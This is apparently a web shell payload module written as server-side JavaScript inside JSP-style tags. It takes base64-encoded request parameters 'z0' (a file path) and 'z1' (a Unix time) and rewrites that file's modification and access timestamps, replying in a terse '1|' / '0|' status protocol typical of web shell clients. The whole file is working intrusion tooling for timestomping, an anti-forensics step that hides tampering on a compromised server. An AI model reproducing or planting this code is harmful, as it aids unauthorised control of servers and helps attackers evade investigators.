<%
(function() {
    response.setContentType("text/html");
    response.setCharacterEncoding("UTF-8");

    var Paths = java.nio.file.Paths;
    var Files = java.nio.file.Files;
    var BasicFileAttributeView = java.nio.file.BasicFileAttributeView;
    var FileTime = java.nio.file.attribute.FileTime;
    var TimeUnit = java.util.concurrent.TimeUnit;

    function output(msg) {
        if (typeof echo === 'function') {
            echo(msg);
        } else {
            out.print(msg);
        }
    }

    function base64_decode(str) {
        if (!str) return "";
        try {
            var decoder = java.util.Base64.getDecoder();
            var decodedBytes = decoder.decode(str);
            return new java.lang.String(decodedBytes, "UTF-8");
        } catch (e) {
            return "";
        }
    }

    var filename = base64_decode(request.getParameter("z0"));
    var timeStr = base64_decode(request.getParameter("z1"));

    if (!filename || !timeStr) {
        output("0|Missing parameters.");
        return;
    }

    function main() {
        try {
            var path = Paths.get(filename);

            if (!Files.exists(path)) {
                output('0|File does not exist.');
                return;
            }

            var timestamp = parseInt(timeStr, 10);
            if (isNaN(timestamp)) {
                output('0|Invalid timestamp.');
                return;
            }

            var fileTime = FileTime.from(timestamp, TimeUnit.SECONDS);
            var attrView = Files.getFileAttributeView(path, BasicFileAttributeView.class);
            if (attrView != null) {
                attrView.setTimes(fileTime, fileTime, null);
                output('1|');
            } else {
                output('0|Failed to modify the timestamps');
            }

        } catch (e) {
            output('0|Failed to modify the timestamps');
        }
    }

    main();
})();
%>